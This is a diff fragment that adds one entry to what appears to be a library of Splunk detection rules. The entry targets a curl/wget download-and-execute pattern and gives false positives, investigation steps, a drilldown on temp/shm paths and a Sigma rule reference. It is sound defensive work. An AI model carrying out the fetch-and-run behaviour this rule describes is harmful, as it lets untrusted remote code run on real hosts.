+        "host"
+      ],
+      "falsePositives": [
+        "Legitimate deployment scripts and configuration management tools (Ansible, cloud-init) often follow this exact pattern — baseline expected automation and exclude known-good scripts by path or hash."
+      ],
+      "investigationSteps": [
+        "Retrieve and inspect the downloaded file if still present.",
+        "Check outbound network connections from the host to the download source."
+      ],
+      "drilldowns": [
+        "Search for process creation events spawned from the temp/shm path shortly after the download."
+      ]
+    },
+    "references": [
+      {
+        "label": "Sigma rule: Suspicious Download and Execute Pattern via Curl/Wget (SigmaHQ)",
+        "url": "id a2d9e2f3-0f43-4c7a-bcd9-9acfc0d723aa — author Aayush Gupta; Detection Rule License 1.1"
+      }
+    ],
+    "relatedEntryIds": [],
+    "validationStatus": "Reviewed",
+    "sourceType": "custom",
+    "author": "SPL Library Team (SPL logic derived from a public Sigma rule; see references)",
+    "version": "1.0",
+    "created": "2026-08-03",
+    "modified": "2026-08-03",
+    "copyCount": 0
   }
 ]
